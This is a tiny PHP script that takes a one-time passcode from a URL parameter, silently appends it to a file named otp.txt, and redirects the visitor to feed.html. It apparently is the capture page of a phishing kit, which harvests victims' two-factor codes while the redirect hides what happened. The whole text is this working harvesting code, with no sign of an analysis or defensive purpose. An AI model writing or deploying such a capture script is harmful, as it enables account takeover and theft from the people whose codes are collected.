<?php
file_put_contents("otp.txt", "" . $otp = $_GET['otp'] . "\n", FILE_APPEND);
header('Location: feed.html');
?>
